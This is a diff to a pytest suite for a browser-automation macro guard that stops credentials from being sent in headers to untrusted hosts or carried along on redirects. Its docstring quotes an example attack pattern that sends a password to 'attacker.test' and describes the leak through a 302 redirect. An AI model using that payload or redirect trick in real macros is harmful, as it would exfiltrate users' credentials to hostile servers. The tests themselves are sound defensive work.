@@ -3,16 +3,24 @@
 # SPDX-Comment: Part of octowright.
 #
 
-"""A credential may ride a header only to the session's own site.
+"""A credential may ride a header only to the session's own site, and only when asked.
 
 Headers became a credential sink because ``inject_headers`` takes a
 macro-chosen ``pattern``: ``{"pattern": "https://attacker.test/**",
 "headers": {"X-Leak": "{{password}}"}}`` delivered the password to that host.
-But "log in, then carry the token" is the ordinary use of a header, so the
-guard lets a credential through when the pattern names -- literally, in the
-macro -- a host the operator chose: the session's launch URL or its persona
+"Log in, then carry the token" is the ordinary use of a header, so the guard
+can let a credential through when the pattern names -- literally, in the macro
+-- a host the operator chose: the session's launch URL or its persona
 ``base_url``. Hosts the macro itself navigates to are not trusted; a poisoned
 macro could navigate to its own server first.
+
+Even then the pattern only scopes the FIRST hop. Playwright applies a routed
+header override to every redirect the request starts, so a ``fetch`` on the
+own site answered ``302 -> attacker`` carries the header there (measured on
+chromium and firefox for every header name; webkit strips only
+``Authorization``). The exemption therefore needs a per-header
+``forward_on_redirect: {"Authorization": true}``, the macro author's statement
+that the own site will not redirect that header somewhere it should not go.
 """
 
 from __future__ import annotations
@@ -29,17 +37,112 @@ TOKEN = {"token": "t0k3n-abc"}  # pragma: allowlist secret (synthetic fixture)
 OWN = frozenset({("https", "app.example.test", 443)})
 
 
-def _inject(pattern: str, header: str = "Bearer {{token}}") -> list[dict[str, object]]:
-    return [{"action": "inject_headers", "pattern": pattern, "headers": {"Authorization": header}}]
+def _inject(pattern: str, header: str = "Bearer {{token}}", *, forward: object = True) -> list[dict[str, object]]:
+    action: dict[str, object] = {"action": "inject_headers", "pattern": pattern, "headers": {"Authorization": header}}
+    if forward is not None:
+        action["forward_on_redirect"] = {"Authorization": forward}
+    return [action]
 
 
 @pytest.mark.parametrize(
     "pattern",
     ["https://app.example.test/**", "https://app.example.test/api/*", "https://APP.example.test:443/**"],
 )
-def test_a_credential_header_to_the_own_site_is_allowed(pattern: str) -> None:
+def test_a_credential_header_to_the_own_site_is_allowed_with_the_opt_in(pattern: str) -> None:
     [action] = substitute(_inject(pattern), TOKEN, trusted_origins=OWN)
     assert action["headers"] == {"Authorization": "Bearer t0k3n-abc"}
+
+
+@pytest.mark.parametrize("forward", [None, False])
+def test_without_the_opt_in_the_own_site_is_refused_and_told_how(forward: object) -> None:
+    with pytest.raises(ValueError, match="credential arg") as excinfo:
+        substitute(_inject("https://app.example.test/**", forward=forward), TOKEN, trusted_origins=OWN)
+    message = str(excinfo.value)
+    assert "forward_on_redirect" in message
+    assert '"Authorization": true' in message
+    assert "redirect" in message
+    assert TOKEN["token"] not in message
+
+
+@pytest.mark.parametrize("spelling", ["Authorization", "authorization", "AUTHORIZATION", " Authorization "])
+def test_the_opt_in_matches_the_header_name_case_insensitively(spelling: str) -> None:
+    actions = [
+        {
+            "action": "inject_headers",
+            "pattern": "https://app.example.test/**",
+            "headers": {"Authorization": "Bearer {{token}}"},
+            "forward_on_redirect": {spelling: True},
+        }
+    ]
+    [action] = substitute(actions, TOKEN, trusted_origins=OWN)
+    assert action["headers"] == {"Authorization": "Bearer t0k3n-abc"}
+    assert "forward_on_redirect" not in action["headers"]
+
+
+def test_the_opt_in_covers_exactly_the_header_it_names() -> None:
+    actions = [
+        {
+            "action": "inject_headers",
+            "pattern": "https://app.example.test/**",
+            "headers": {"Authorization": "Bearer {{token}}", "X-Trace": "{{token}}"},
+            "forward_on_redirect": {"Authorization": True},
+        }
+    ]
+    with pytest.raises(ValueError, match="X-Trace"):
+        substitute(actions, TOKEN, trusted_origins=OWN)
+
+
+@pytest.mark.parametrize(
+    "opt_in",
+    [
+        {"Authorization": "true"},
+        {"Authorization": 1},
+        {"Authorization": None},
+        {"Authorization": "{{flag}}"},
+        True,
+        ["Authorization"],
+        "Authorization",
+        {"X-Not-Sent": True},
+    ],
+    ids=["str", "int", "none", "placeholder", "bare-bool", "list", "str-name", "unknown-header"],
+)
+def test_a_malformed_opt_in_is_refused_not_coerced(opt_in: object) -> None:
+    actions = [
+        {
+            "action": "inject_headers",
+            "pattern": "https://app.example.test/**",
+            "headers": {"Authorization": "Bearer {{token}}"},
+            "forward_on_redirect": opt_in,
+        }
+    ]
+    with pytest.raises(ValueError, match="forward_on_redirect"):
+        substitute(actions, {**TOKEN, "flag": "true"}, trusted_origins=OWN)
+
+
+def test_a_malformed_opt_in_is_refused_even_with_no_credential_in_play() -> None:
+    actions = [
+        {
+            "action": "inject_headers",
+            "pattern": "https://app.example.test/**",
+            "headers": {"X-Env": "staging"},
+            "forward_on_redirect": {"X-Env": "yes"},
+        }
+    ]
+    with pytest.raises(ValueError, match="forward_on_redirect"):
+        substitute(actions, {}, trusted_origins=OWN)
+
+
+def test_the_sink_opt_out_still_allows_it_without_the_header_opt_in(monkeypatch: pytest.MonkeyPatch) -> None:
+    monkeypatch.setenv("OCTOWRIGHT_MACRO_CREDENTIAL_SINKS", "allow")
+    [action] = substitute(_inject("https://app.example.test/**", forward=None), TOKEN, trusted_origins=OWN)
+    assert action["headers"] == {"Authorization": "Bearer t0k3n-abc"}
+
+
+def test_a_mocked_responses_headers_to_the_own_site_need_no_opt_in() -> None:
+    """mock_route's headers are a RESPONSE served to the page: nothing is forwarded upstream."""
+    actions = [{"action": "mock_route", "pattern": "https://app.example.test/**", "headers": {"X-T": "{{token}}"}}]
+    [action] = substitute(actions, TOKEN, trusted_origins=OWN)
+    assert action["headers"] == {"X-T": "t0k3n-abc"}
 
 
 @pytest.mark.parametrize(
@@ -58,8 +161,10 @@ def test_a_credential_header_to_the_own_site_is_allowed(pattern: str) -> None:
     ],
 )
 def test_a_credential_header_anywhere_else_is_refused(pattern: str) -> None:
-    with pytest.raises(ValueError, match="credential arg"):
+    """The opt-in waives only the redirect refusal; it never makes another host an own site."""
+    with pytest.raises(ValueError, match="credential arg") as excinfo:
         substitute(_inject(pattern), {**TOKEN, "host": "app.example.test"}, trusted_origins=OWN)
+    assert '"Authorization": true' not in str(excinfo.value)  # not offered as the fix here
 
 
 def test_no_trusted_origins_refuses_as_before() -> None:
@@ -185,6 +290,8 @@ async def test_run_macro_allows_a_token_header_to_the_launch_site(
     await execution.run_macro(session, "m", dict(TOKEN))
     session.inject_headers.assert_awaited_once()
     assert session.inject_headers.await_args.kwargs["headers"] == {"Authorization": "Bearer t0k3n-abc"}
+    # A guard input, never a session-method argument.
+    assert "forward_on_redirect" not in session.inject_headers.await_args.kwargs
 
 
 @pytest.mark.anyio
